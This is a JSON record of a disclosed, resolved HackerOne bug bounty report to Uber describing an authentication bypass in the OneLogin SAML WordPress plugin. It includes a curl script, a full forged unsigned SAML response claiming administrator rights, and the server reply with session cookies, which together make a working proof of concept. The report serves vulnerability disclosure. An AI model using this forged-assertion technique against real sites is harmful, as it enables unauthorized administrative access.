@@ -1,0 +1,134 @@
+{
+  "id": 136169,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMzYxNjk=",
+  "url": "https://hackerone.com/reports/136169",
+  "title": "OneLogin authentication bypass on WordPress sites",
+  "state": "Closed",
+  "substate": "resolved",
+  "readable_substate": "Resolved",
+  "created_at": "2016-05-04T07:29:37.558Z",
+  "submitted_at": "2016-05-04T07:29:37.558Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "jouko",
+    "url": "/jouko",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/mqyrwb0f5m6e7yq17l0nrhhz32yw/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 314,
+    "url": "https://hackerone.com/uber",
+    "handle": "uber",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/314/24ea21370a71b18eafb5722d5855825ab622b5dd_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/314/24ea21370a71b18eafb5722d5855825ab622b5dd_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Uber",
+      "twitter_handle": "",
+      "website": "https://www.uber.com",
+      "about": ""
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2016-06-06T09:54:01.182Z",
+  "bug_reporter_agreed_on_going_public_at": "2016-05-07T09:53:44.840Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "First, I'm sorry about reporting another WordPress bug (my intention was just to check if WP-OneLogin stores any sensitive info that could be used to attack OneLogin on your other websites).\n\n#Overview#\nThe *.uber.com WordPress sites use OneLogin SAML-SSO instead of the normal WordPress login. The WordPress plugin shipped by OneLogin has a bug which allows anyone to login without a password or other authentication.\n\nThe attacker can supply a username, email adress, name, and a role. If the username doesn't already exist in the WordPress database, then the plugin will create a new user (if the provisioning setting is on, which it was on the two sites I tested).\n\nIt looks like in order to gain administrator privileges the attacker has to guess some information - a role name such as \"administrator\", or the email address or username of an existing administrator.\n\n#PoC#\nI tried this on two sites. On eng.uber.com I couldn't guess a correct role name, user name, or email address to get administrator privileges and therefore was able to create only a \"subscriber\" level account. On newsroom.uber.com the role name apparently was simply \"administrator\" so I got that privilege on the system. Some other plugin settings may affect this behavior too.\n\n#Reproducing#\nAn example shell script:\n~~~~ sh\n#!/bin/sh\nxml=`base64 response.xml`\ncurl -v 'https://newsroom.uber.com/wp-content/plugins/onelogin-saml-sso/onelogin_saml.php?acs' \\\n    --data \"RelayState=/wp-login.php\" --data-urlencode \"SAMLResponse=$xml\"\n~~~~\nThe required file \"response.xml\" containing a SAML response:\n~~~~ xml\n<samlp:Response xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\" xmlns:samlp=\"urn:oasis:names:tc:SAML:2.0:protocol\" ID=\"R0bdb6f33ef84425aa2782eab4483792762f297df\" Version=\"2.0\" IssueInstant=\"2016-05-04T01:37:34Z\" Destination=\"\" InResponseTo=\"ONELOGIN_bd24d63eafe235201b1bc636823c84381dbe575c\">\n<samlp:Status><samlp:StatusCode Value=\"urn:oasis:names:tc:SAML:2.0:status:Success\"/></samlp:Status>\n<saml:Assertion xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\" xmlns:xs=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" Version=\"2.0\" ID=\"pfxb75932c2-2e44-d18d-224b-354849a292af\" IssueInstant=\"2016-05-04T01:37:34Z\">\n<saml:Subject>\n<saml:NameID Format=\"urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress\">jouko@iki.fi</saml:NameID>\n<saml:SubjectConfirmation Method=\"urn:oasis:names:tc:SAML:2.0:cm:bearer\">\n<saml:SubjectConfirmationData NotOnOrAfter=\"2016-05-04T01:40:34Z\" Recipient=\"\" InResponseTo=\"ONELOGIN_bd24d63eafe235201b1bc636823c84381dbe575c\"/>\n</saml:SubjectConfirmation>\n</saml:Subject>\n<saml:Conditions NotBefore=\"2016-05-04T01:34:34Z\" NotOnOrAfter=\"2016-05-04T01:40:34Z\">\n<saml:AudienceRestriction>\n<saml:Audience>php-saml</saml:Audience>\n</saml:AudienceRestriction>\n</saml:Conditions>\n<saml:AuthnStatement AuthnInstant=\"2016-05-04T01:37:33Z\" SessionNotOnOrAfter=\"2016-05-05T01:37:34Z\" SessionIndex=\"_b340ffa0-f3c6-0133-3483-02a5406d9a2f\">\n<saml:AuthnContext>\n<saml:AuthnContextClassRef>\nurn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport\n</saml:AuthnContextClassRef>\n</saml:AuthnContext>\n</saml:AuthnStatement>\n<saml:AttributeStatement>\n<saml:Attribute NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\" Name=\"User.Username\">\n<saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\">admin</saml:AttributeValue>\n</saml:Attribute>\n<saml:Attribute NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\" Name=\"User.LastName\">\n<saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\">Pynnonen</saml:AttributeValue>\n</saml:Attribute>\n<saml:Attribute NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\" Name=\"User.FirstName\">\n<saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\">Jouko</saml:AttributeValue>\n</saml:Attribute>\n<saml:Attribute NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\" Name=\"User.email\">\n<saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\">noreply@uber.com</saml:AttributeValue>\n</saml:Attribute>\n<saml:Attribute NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\" Name=\"memberOf\">\n<saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\">Administrator</saml:AttributeValue>\n</saml:Attribute>\n</saml:AttributeStatement>\n</saml:Assertion>\n</samlp:Response>\n\n~~~~\n\nRunning the script sends an HTTP request containing a faked SAML response to WordPress. The plugin accepts it, sets authentication cookies and redirects the user to the front page.\n\nSample WP response:\n~~~~\nHTTP/1.1 302 Found\nServer: nginx\nDate: Wed, 04 May 2016 06:24:22 GMT\nContent-Type: text/html\nContent-Length: 20\nConnection: keep-alive\nKeep-Alive: timeout=20\nSet-Cookie: wordpress_sec_1215024994609a88de6286519d141a3d=trojmiasto%7C1462515862%7CYE7KrDOk28mEiwgNKVQZrbhOcj8NfNTzAhachcDGnHl%7Ceb93b7768e2ebb6625b58e4bc7c2c4e63cce7651846e1b834d649258f2b9a9cd; path=/wp-content/plugins; secure; httponly\nSet-Cookie: wordpress_sec_1215024994609a88de6286519d141a3d=trojmiasto%7C1462515862%7CYE7KrDOk28mEiwgNKVQZrbhOcj8NfNTzAhachcDGnHl%7Ceb93b7768e2ebb6625b58e4bc7c2c4e63cce7651846e1b834d649258f2b9a9cd; path=/; secure; httponly\nSet-Cookie: wordpress_logged_in_1215024994609a88de6286519d141a3d=trojmiasto%7C1462515862%7CYE7KrDOk28mEiwgNKVQZrbhOcj8NfNTzAhachcDGnHl%7Ce566c71dac745da6f17cd52c7c3c2d3f0cc6baec81b4d79d97fb153896e0acee; path=/; secure; httponly\nSet-Cookie: saml_login=1; expires=Thu, 04-May-2017 06:24:22 GMT; path=/\nSet-Cookie: wordpress_user_sw_1215024994609a88de6286519d141a3d=+; expires=Tue, 05-May-2015 06:24:22 GMT; path=/\nSet-Cookie: wordpress_user_sw_secure_1215024994609a88de6286519d141a3d=+; expires=Tue, 05-May-2015 06:24:22 GMT; path=/\nSet-Cookie: wordpress_user_sw_olduser_1215024994609a88de6286519d141a3d=+; expires=Tue, 05-May-2015 06:24:22 GMT; path=/\nLocation: https://newsroom.uber.com\n~~~~\nAfter this you can e.g. copy the cookies to a web browser to use the website as a logged-in user.\n\n#Details#\nThe WordPress plugin fails to adequately validate the SAML response. The bug is in the file *wp-content/plugins/onelogin-saml-sso/php/lib/Saml2/Response.php*, function *isValid()*. The cryptographical signature check is inside a code block that is executed only if the XML response contains a <ds:Signature /> tag.\n~~~~ php\n   if (!empty($signedElements)) {\n       // verify signature\n   }\n~~~~\nIf the tag is left out, then the plugin accepts any \"authentication OK\" response without checking if it's coming from a trusted source.\n\nThe above XML may have some unnecessary data. I just took a valid OneLogin response and removed the <ds:Signature /> tag, plus some others.\n\n",
+  "bounty_amount": "10000.0",
+  "formatted_bounty": "$10,000",
+  "weakness": {
+    "id": 27,
+    "name": "Improper Authentication - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 91386,
+      "file_name": "newsroom.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/091/386/94aa2135022d5eadc88e487a9788589632f8640a/newsroom.png?response-content-disposition=attachment%3B%20filename%3D%22newsroom.png%22%3B%20filename%2A%3DUTF-8%27%27newsroom.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXCS3PB6G%2F20260607%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260607T124218Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENT%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDXss9BLU7eOVYlXPNODoUiXnuPNivD1UnqaPw0qZV7AQIhAIAfbQjK%2Fq1hUfoVGkI9zbUwwhMGfkSBG7OUgrzUT3wiKrsFCJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgwdEI0jFIhLwvOTCWwqjwXXn43lqNr6X0u9ty0F4TNEK6g9AZHATyGuNi%2Fp3vrV1XDH2V7pa%2FnPCcB%2FgEEHiZ0c7XEBR4mQ11cRFKpoZxLM0fPr4mtmL1Br7%2B4O%2FHu8yUHWN2dr1k7ENEbpUzuQBa6s0T1ISCRej89vmYI%2B8YfYwG%2ByeIp00r4zMKpnzfNnTlSiFvwlrUfs3q8ArC%2FbXiSkTXntt%2BQiIekjtXJnTpTADCEmEumtwRu7PRNttZH4NvM5lWJyfwGYfg%2BJ1gskfvsBnbMrtr1tszC3x4MBCM2FlSY%2BgIZk4ots%2B5K%2BbwJFdrrEbLCiV1D4%2BywPRDpXvE5iHsITit4%2BJ72ZZxvDOipLu%2FVh%2BLsY75Q7eEqePUoFlaWkZGQ8jgJt2n%2FsC0HgyQMzZain3inHQ4OnW1TEft8ErRWECJq9QxfB7odhKexNiYsxwW2HSM8SYn%2FPbeZqnbmrCZiL0fuJVxnIPArUEEElGf2g63%2BOZoXDcZxeY0TjLd98hWHjg6vXjH9a6ICeY3PHQ9OA0VSQlUbPLtTvS7PlFPmzeSzLW4OCrBBNi9ZJBfx1qTZDZBayYJQrHFZno4zAOiCZ7zMqY5N5tkL0sPEyyqqensVXtOmqjS2C3KOn%2BA%2B94A4T2Yqln8sMsYLVlzPQxC5dTBVUgL1ClY%2FbIcDFUKohE%2BvITPPcaiMvB%2FfYVgVaJ1Y4GCKIOmEOBkvD151d9VDVzdmX4YZyNmlBEwT9iZM2%2Ba%2FkufkE34BOtYb3y8iNXBfKFD9XSg%2FYQfK%2FedXF2rL5fwn2fQjCdYKYf8ylVMZUWVVFAix4bIRqHXYqaqrUEwxYbBO0dPUDlcFN2DtKA9hJWUTZSKI6L3N7EReCNNDU9iNQEqckmnKkbNXWMM%2BzldEGOrABnnUO%2BhnDqxAf5BmQXmM9cIJWxMv435VeA7%2FHXBJ4TORPHByuG2hxGTlBbgu86wFlLyJhJ3CGJD1AxcUvRKSgEcV%2BzBHV9gJEaMrPkDXIBOgM0VwFfAoZvRAIhQ7nADkuIrjrGdyAfK4Rv2m8bGluUv7B3NhzyD23L3E%2FnylbfbX6vRoxK9DCgJlBQXRV3w7YGYkU%2F44cc0BYTbEGLea5jpog%2BYeV6dKgK9Q4ZVODgnk%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=c355504acb3600be79dabe3b6da6e9ca8258dbfe9877fe4966e70db30140fdd3",
+      "file_size": 430282,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 91387,
+      "file_name": "newsroom3.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/091/387/fad82e776d93c2695a14567f5357bc86f4e1a021/newsroom3.png?response-content-disposition=attachment%3B%20filename%3D%22newsroom3.png%22%3B%20filename%2A%3DUTF-8%27%27newsroom3.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXCS3PB6G%2F20260607%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260607T124218Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENT%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDXss9BLU7eOVYlXPNODoUiXnuPNivD1UnqaPw0qZV7AQIhAIAfbQjK%2Fq1hUfoVGkI9zbUwwhMGfkSBG7OUgrzUT3wiKrsFCJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgwdEI0jFIhLwvOTCWwqjwXXn43lqNr6X0u9ty0F4TNEK6g9AZHATyGuNi%2Fp3vrV1XDH2V7pa%2FnPCcB%2FgEEHiZ0c7XEBR4mQ11cRFKpoZxLM0fPr4mtmL1Br7%2B4O%2FHu8yUHWN2dr1k7ENEbpUzuQBa6s0T1ISCRej89vmYI%2B8YfYwG%2ByeIp00r4zMKpnzfNnTlSiFvwlrUfs3q8ArC%2FbXiSkTXntt%2BQiIekjtXJnTpTADCEmEumtwRu7PRNttZH4NvM5lWJyfwGYfg%2BJ1gskfvsBnbMrtr1tszC3x4MBCM2FlSY%2BgIZk4ots%2B5K%2BbwJFdrrEbLCiV1D4%2BywPRDpXvE5iHsITit4%2BJ72ZZxvDOipLu%2FVh%2BLsY75Q7eEqePUoFlaWkZGQ8jgJt2n%2FsC0HgyQMzZain3inHQ4OnW1TEft8ErRWECJq9QxfB7odhKexNiYsxwW2HSM8SYn%2FPbeZqnbmrCZiL0fuJVxnIPArUEEElGf2g63%2BOZoXDcZxeY0TjLd98hWHjg6vXjH9a6ICeY3PHQ9OA0VSQlUbPLtTvS7PlFPmzeSzLW4OCrBBNi9ZJBfx1qTZDZBayYJQrHFZno4zAOiCZ7zMqY5N5tkL0sPEyyqqensVXtOmqjS2C3KOn%2BA%2B94A4T2Yqln8sMsYLVlzPQxC5dTBVUgL1ClY%2FbIcDFUKohE%2BvITPPcaiMvB%2FfYVgVaJ1Y4GCKIOmEOBkvD151d9VDVzdmX4YZyNmlBEwT9iZM2%2Ba%2FkufkE34BOtYb3y8iNXBfKFD9XSg%2FYQfK%2FedXF2rL5fwn2fQjCdYKYf8ylVMZUWVVFAix4bIRqHXYqaqrUEwxYbBO0dPUDlcFN2DtKA9hJWUTZSKI6L3N7EReCNNDU9iNQEqckmnKkbNXWMM%2BzldEGOrABnnUO%2BhnDqxAf5BmQXmM9cIJWxMv435VeA7%2FHXBJ4TORPHByuG2hxGTlBbgu86wFlLyJhJ3CGJD1AxcUvRKSgEcV%2BzBHV9gJEaMrPkDXIBOgM0VwFfAoZvRAIhQ7nADkuIrjrGdyAfK4Rv2m8bGluUv7B3NhzyD23L3E%2FnylbfbX6vRoxK9DCgJlBQXRV3w7YGYkU%2F44cc0BYTbEGLea5jpog%2BYeV6dKgK9Q4ZVODgnk%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=9a4ef981b9b510f3c7c91ac3a20397b7d166850021e5f8382b329c32ab549c10",
+      "file_size": 64215,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2016-06-06T09:53:44.967Z",
+  "allow_singular_disclosure_after": -315629313.1818772,
+  "singular_disclosure_allowed": true,
+  "vote_count": 58,
+  "voters": [
+    "loaymorad",
+    "7orus",
+    "n1m0",
+    "floerer",
+    "p1stachios",
+    "stefanovettorazzi",
+    "thruster",
+    "jouko",
+    "bogdantc",
+    "jobert",
+    "and 48 more..."
+  ],
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
